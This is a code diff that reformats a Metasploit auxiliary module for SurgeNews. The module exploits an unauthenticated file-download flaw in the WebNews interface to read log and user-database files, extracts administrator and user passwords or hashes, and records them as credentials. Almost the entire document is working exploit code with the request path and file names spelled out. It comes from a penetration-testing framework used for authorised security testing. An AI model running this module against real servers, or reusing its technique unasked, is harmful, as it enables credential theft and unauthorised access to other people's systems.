@@ -8,31 +8,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
-  HttpFingerprint = { :pattern => [ /DManager/ ] }
+  HttpFingerprint = { pattern: [ /DManager/ ] }
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'           => 'SurgeNews User Credentials',
-      'Description'    => %q{
-        This module exploits a vulnerability in the WebNews web interface
-        of SurgeNews on TCP ports 9080 and 8119 which allows unauthenticated
-        users to download arbitrary files from the software root directory;
-        including the user database, configuration files and log files.
+    super(
+      update_info(
+        info,
+        'Name' => 'SurgeNews User Credentials',
+        'Description' => %q{
+          This module exploits a vulnerability in the WebNews web interface
+          of SurgeNews on TCP ports 9080 and 8119 which allows unauthenticated
+          users to download arbitrary files from the software root directory;
+          including the user database, configuration files and log files.
 
-        This module extracts the administrator username and password, and
-        the usernames and passwords or password hashes for all users.
+          This module extracts the administrator username and password, and
+          the usernames and passwords or password hashes for all users.
 
-        This module has been tested successfully on SurgeNews version
-        2.0a-13 on Windows 7 SP 1 and 2.0a-12 on Ubuntu Linux.
-      },
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+          This module has been tested successfully on SurgeNews version
+          2.0a-13 on Windows 7 SP 1 and 2.0a-12 on Ubuntu Linux.
+        },
+        'License' => MSF_LICENSE,
+        'References' => [
           ['URL', 'http://news.netwinsite.com:8119/webnews?cmd=body&item=34896&group=netwin.surgemail'],
         ],
-      'Author'         => 'bcoles',
-      'DisclosureDate' => '2017-06-16'))
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS]
+        },
+        'Author' => 'bcoles',
+        'DisclosureDate' => '2017-06-16'
+      )
+    )
 
     register_options [ Opt::RPORT(9080) ]
   end
@@ -41,12 +48,13 @@ class MetasploitModule < Msf::Auxiliary
     3
   end
 
-  def check_host(ip)
+  def check_host(_ip)
     @tries = 0
     res = read_file 'install.log'
     if res =~ /SurgeNews/
       return Exploit::CheckCode::Vulnerable
     end
+
     Exploit::CheckCode::Safe
   end
 
@@ -54,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
     data = nil
     @tries += 1
     vprint_status "Retrieving file: #{file}"
-    res = send_request_cgi 'uri'      => normalize_uri(target_uri.path, 'webnews'),
+    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'webnews'),
                            'vars_get' => { 'cmd' => 'part', 'fname' => file }
     if !res
       vprint_error 'Connection failed'
@@ -81,6 +89,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def parse_log(log_data)
     return if log_data.nil?
+
     username = log_data.scan(/value_set\(manager\)\((.*)\)/).flatten.reject { |c| c.to_s.empty? }.last
     password = log_data.scan(/value_set\(password\)\((.*)\)/).flatten.reject { |c| c.to_s.empty? }.last
     { 'username' => username, 'password' => password }
@@ -88,35 +97,39 @@ class MetasploitModule < Msf::Auxiliary
 
   def parse_user_db(user_data)
     return if user_data.nil?
+
     creds = []
     user_data.lines.each do |line|
       next if line.eql? ''
-      if line =~ /^(.+?):(.*):Groups=/
-        user = $1
-        pass = $2
-        # clear text credentials are prefaced with '*'
-        if pass.starts_with? '*'
-          creds << { 'username' => user, 'password' => pass[1..-1] }
-        # otherwise its a hash
-        else
-          creds << { 'username' => user, 'hash' => pass }
-        end
+
+      next unless line =~ /^(.+?):(.*):Groups=/
+
+      user = ::Regexp.last_match(1)
+      pass = ::Regexp.last_match(2)
+      # clear text credentials are prefaced with '*'
+      if pass.starts_with? '*'
+        creds << { 'username' => user, 'password' => pass[1..] }
+      # otherwise its a hash
+      else
+        creds << { 'username' => user, 'hash' => pass }
       end
     end
     creds
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     @tries = 0
 
-    service_data = { address:      rhost,
-                     port:         rport,
-                     service_name: (ssl ? 'https' : 'http'),
-                     protocol:     'tcp',
-                     workspace_id: myworkspace_id }
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-    cred_table = Rex::Text::Table.new 'Header'  => 'SurgeNews User Credentials',
-                                      'Indent'  => 1,
+    cred_table = Rex::Text::Table.new 'Header' => 'SurgeNews User Credentials',
+                                      'Indent' => 1,
                                       'Columns' => ['Username', 'Password', 'Password Hash', 'Admin']
 
     # Read administrator password from password.log
@@ -132,57 +145,69 @@ class MetasploitModule < Msf::Auxiliary
       print_good "Found administrator credentials (#{admin['username']}:#{admin['password']})"
       cred_table << [admin['username'], admin['password'], nil, true]
 
-      credential_data = { origin_type:     :service,
-                          module_fullname: fullname,
-                          private_type:    :password,
-                          private_data:    admin['password'],
-                          username:        admin['username'] }
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        private_type: :password,
+        private_data: admin['password'],
+        username: admin['username']
+      }
 
       credential_data.merge! service_data
       credential_core = create_credential credential_data
-      login_data = { core:         credential_core,
-                     access_level: 'Administrator',
-                     status:       Metasploit::Model::Login::Status::UNTRIED }
+      login_data = {
+        core: credential_core,
+        access_level: 'Administrator',
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }
       login_data.merge! service_data
       create_credential_login login_data
     end
 
     # Read user credentials from nwauth.add
     users = parse_user_db read_file 'nwauth.add'
-    if users.nil?
+    if users.blank?
       vprint_error 'Found no user credentials in nwauth.add'
-    else
-      vprint_status "Found #{users.length} users in nwauth.add"
+      return
     end
+    vprint_status "Found #{users.length} users in nwauth.add"
 
-    users.each do |user|
-      next if user.empty?
+    unless users.nil?
+      users.each do |user|
+        next if user.empty?
 
-      cred_table << [user['username'], user['password'], user['hash'], false]
+        cred_table << [user['username'], user['password'], user['hash'], false]
 
-      if user['password']
-        print_good "Found user credentials (#{user['username']}:#{user['password']})"
-        credential_data = { origin_type:     :service,
-                            module_fullname: fullname,
-                            private_type:    :password,
-                            private_data:    user['password'],
-                            username:        user['username'] }
-      else
-        credential_data = { origin_type:     :service,
-                            module_fullname: fullname,
-                            private_type:    :nonreplayable_hash,
-                            private_data:    user['hash'],
-                            username:        user['username'] }
+        if user['password']
+          print_good "Found user credentials (#{user['username']}:#{user['password']})"
+          credential_data = {
+            origin_type: :service,
+            module_fullname: fullname,
+            private_type: :password,
+            private_data: user['password'],
+            username: user['username']
+          }
+        else
+          credential_data = {
+            origin_type: :service,
+            module_fullname: fullname,
+            private_type: :nonreplayable_hash,
+            private_data: user['hash'],
+            username: user['username']
+          }
+        end
+
+        credential_data.merge! service_data
+        credential_core = create_credential credential_data
+        login_data = {
+          core: credential_core,
+          access_level: 'User',
+          status: Metasploit::Model::Login::Status::UNTRIED
+        }
+        login_data.merge! service_data
+        create_credential_login login_data
       end
-
-      credential_data.merge! service_data
-      credential_core = create_credential credential_data
-      login_data = { core:         credential_core,
-                     access_level: 'User',
-                     status:       Metasploit::Model::Login::Status::UNTRIED }
-      login_data.merge! service_data
-      create_credential_login login_data
-    end unless users.nil?
+    end
 
     print_line
     print_line cred_table.to_s
